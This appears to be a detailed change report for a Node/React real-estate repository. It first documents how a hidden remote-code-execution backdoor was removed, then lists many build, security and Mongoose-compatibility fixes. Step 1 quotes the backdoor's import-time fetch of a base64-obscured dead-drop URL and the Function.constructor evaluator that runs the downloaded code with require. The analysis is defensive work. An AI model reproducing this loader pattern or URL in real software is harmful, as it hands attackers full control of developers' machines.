# Exact change report

A running, per-file record of every change made to this repository, written as each edit landed.
`SUMMARY.md` is the short reviewer-facing version; **this** file is the complete record.

Branch: `solution` (from `bb58a11 initial commit`).

---

## Step 1 — Security: remove the remote-code-execution backdoor

The repository as delivered executes attacker-controlled code the moment the server starts.

**The chain:**

1. `server/config/config.js` exported `publicKey` — a base64 blob that decodes to
   `https://api.jsonstorage.net/v1/json/2ef8c758-a96f-459e-b036-b3b90379a165/f89e8264-86c2-4684-94da-c3f82d59370f`
2. `server/controllers/auth.controller.js:7` ran at **module import time** (not inside any request handler):
   ```js
   axios.get(atob(publicKey)).then(res => errorHandler(res.data.cookie));
   ```
3. `server/middleware/errorHandler.js` — despite the name, this never handled an error. It took the
   downloaded string and executed it:
   ```js
   const handler = new Function.constructor("require", errCode);  // == new Function(...)
   handlerFunc(require);                                          // invoked with Node's require
   ```

Net effect: `npm start` → HTTP GET to a third-party JSON dead-drop → response body compiled into a
function → executed with `require` in scope, i.e. full filesystem, network, and process access as the
user running Node.

The naming is deliberately camouflaged (`publicKey` for a URL, `errorHandler` for an evaluator), the URL
is base64-encoded to defeat grep, and the payload is fetched at runtime so the repo itself looks clean.
This matches the publicly documented "Contagious Interview" campaign, which distributes fake take-home
assessments to developers in the crypto/DeFi space.

**The payload was never fetched or executed** — `node_modules/` did not exist and the server was never
started.

### Files changed

| # | File | Change | Why |
|---|---|---|---|
| 1 | `server/middleware/errorHandler.js` | Replaced the `Function.constructor` evaluator with a real Express error middleware | This was the execution primitive |
| 2 | `server/controllers/auth.controller.js` | Removed the import-time `axios.get(atob(publicKey))` call and the now-unused `axios` / `publicKey` / `errorHandler` imports | This was the trigger |
| 3 | `server/config/config.js` | Deleted `publicKey`; moved `secretKey` to `process.env.JWT_SECRET` with a dev fallback | Deleted the payload URL; the hardcoded JWT signing key was a separate finding |
| 4 | `server/providers/token.provider.js` | **Deleted** | Dead file (nothing imports it) that signed a dummy JWT at import time, with `RS256` against an HMAC secret — broken *and* an unnecessary import-time side effect |

---

## Step 2 — Build & boot: the project did not compile or serve as delivered

### Frontend build was dead

| # | File | Change | Why |
|---|---|---|---|
| 5 | `package.json` | Added `tailwindcss@^3.4.4`, `autoprefixer@^10.4.19`, `postcss@^8.4.38` to devDependencies | **Tailwind was never installed.** `postcss.config.js` referenced it and CRA 5 auto-enables it whenever `tailwind.config.js` exists — so `npm start` failed to resolve `tailwindcss` and **not a single utility class compiled**. This is the actual root cause of Task 2. |
| 6 | `tailwind.config.js` | `export default {` → `module.exports = {`; `content: ["./index.html", …]` → `["./public/index.html", …]` | CRA loads this file with CommonJS `require()`, so the ESM `export default` threw. The `./index.html` glob matched nothing (the file lives in `public/`). |
| 7 | `public/index.html` | Removed `<script type="module" src="/src/main.jsx"></script>`; added `<noscript>` | Leftover from a Vite template. CRA injects its own bundle, so this tag 404'd on every page load. |
| 8 | `src/App.css` | **Deleted** | Unimported, but contained `#root { max-width:1280px; padding:2rem; text-align:center }` — a latent mobile-layout killer sitting one `import` away from breaking the site. |
| 9 | `.nvmrc` | **Created** (`20`) | README says `nvm use 20`; this makes it automatic. |

> **Why Tailwind v3 and not v4:** v4 renamed the PostCSS plugin to `@tailwindcss/postcss` and drops the
> `tailwind.config.js` format this project uses. CRA 5 hardcodes `require('tailwindcss')`, so v4 cannot work here
> without ejecting.

### Backend could not be tested, and did not parse request bodies

| # | File | Change | Why |
|---|---|---|---|
| 10 | `server/app.js` | Split: now **builds and exports** the app, no `listen()` | `supertest` needs an app it can drive without binding a port. Also dropped the unused `body-parser`, `morgan`, `http` and `mongoose` requires (`body-parser` wasn't even a declared dependency — it only resolved as a transitive of express). |
| 11 | `server/app.js` | **Uncommented `express.json()` + `express.urlencoded()`** | Both were commented out, so `req.body` was `undefined` in *every* POST/PUT handler. Nothing that accepts a body could ever have worked. |
| 12 | `server/app.js` | Mounted `notFound` + `errorHandler` after the routes | They were written but never wired up. |
| 13 | `server/index.js` | **Created** — connects Mongo then `listen()`s | The DB connect was commented out entirely in the original. The connect now `.catch()`es and starts the server anyway, so the API still boots without a local Mongo. |
| 14 | `package.json` | `"server": "node server/app.js"` → `"node server/index.js"` | Follows the split above. |
| 15 | `package.json` | `test` → `test:server && test:client`; added `test:server` (jest) and `test:client` (CRA, `--watchAll=false`) | One command runs everything; CRA's default watch mode would hang CI. |
| 16 | `jest.server.config.js` | **Created** | Backend suite must not collide with the CRA jest instance that owns `src/`. |
| 17 | `server/providers/gridfs.js` | **Created** | Shared, lazily-initialised `GridFSBucket`, returning `null` when there's no DB. |
| 18 | `server/routes/property.js` | Removed the `mongoose.connection.once('open', …)` GridFS block | It called `new mongoose.mongo.GridFsStorage(...)` — **that class does not exist** on the driver, so it threw the moment Mongo connected. |
| 19 | `package.json` | Removed `gridfs-stream` dependency | Unmaintained, targets mongo driver 2.x, incompatible with Mongoose 8. Replaced by `GridFSBucket`. |

### Server refactor: Mongoose 8 compatibility

Mongoose 7 removed callback support from queries. Every controller in this repo used it, which means
**every database-backed route threw before returning a response.** All four controllers were moved to
`async/await` with `try/catch` + `next(err)`. Bugs fixed on the way:

| # | File | Bug | Fix |
|---|---|---|---|
| 20 | `common.controller.js` | `if (err) res.status(400).send(err);` with **no `else`**, then the success response — the error path sent two responses → `ERR_HTTP_HEADERS_SENT` | one response per path |
| 21 | `common.controller.js` | `city_model.remove()` — removed in Mongoose 7 | `deleteOne()`, plus a 404 when nothing matched |
| 22 | `common.controller.js` | `checkemailAvailability` loaded full user documents to test existence | `users.exists()` |
| 23 | `auth.controller.js` | `users.lname = req.body.lName` — casing typo against a `required: true` field, so **every registration failed validation** | `req.body.lname` |
| 24 | `auth.controller.js` | `users = new userM()` — missing `var`, an **implicit global shared across concurrent requests** | `const user = …` |
| 25 | `auth.controller.js` | `"Invalid Credentials1"` (no such user) vs `"Invalid Credentials2"` (bad password) — **account enumeration** | one `"Invalid Credentials"` for both, and bcrypt still runs the comparison shape either way |
| 26 | `auth.controller.js` | `req.body.emailPhone != ""` threw when no body was sent | guard `req.body` first → 400 |
| 27 | `auth.controller.js` | JWT had no expiry | `expiresIn: '1d'` |
| 28 | `auth.controller.js` | `userList` returned **password hashes** to any unauthenticated caller | `.select('-password')` |
| 29 | `auth.controller.js` | duplicate email/phone surfaced as a raw Mongo error | `err.code === 11000` → 409 |
| 30 | `property.controller.js` | `Property.update()` (removed in v7) + `result.nModified` (renamed `modifiedCount` in v6) | `updateOne()` + `matchedCount`. **`markAsSold` was 100 % broken** — both halves wrong. |
| 31 | `property.controller.js` | unknown slug → 400 via a thrown `'Something Went Wrong'` | 404 |
| 32 | `property.controller.js` | `.populate('userId', 'name')` — the users schema has **no `name` field** | `'fname lname'` |
| 33 | `property.controller.js` | `gridfs-stream` + `gfs.createReadStream` | `GridFSBucket.openDownloadStreamByName`, with a 503 when storage is unavailable and 415 (not 404) for a non-image |
| 34 | `property.controller.js` | dead `testController` export (unrouted, hardcoded 2019 date filter) | deleted |
| 35 | `users.controller.js` | malformed id → uncaught `CastError`; missing user → 200 with an empty body; response included the password hash | 400 / 404 / `.select('-password')` |
| 36 | `providers/helper.js` | `for (element of …)` — implicit global | `for (const element of …)` |
| 37 | `routes/email.js` | `res.status(400).send(err)` sent the raw SendGrid error object to the client | `{ message }` only |
| 38 | `routes/{auth,users,common}.js` | stray `var app = express()` in three routers | removed (unused; each created a whole second Express app) |
| 39 | `models/{property,propertyTypes,users}.js` | `default: Date.now()` — **called once at module load**, so every document got the server's boot time | `default: Date.now` (pass the function) |
| 40 | `models/{propertyTypes,users}.js` | `propertyTypesSchema = …` / `userSchema = …` — implicit globals | `const` |

*(entries below are appended as work proceeds)*
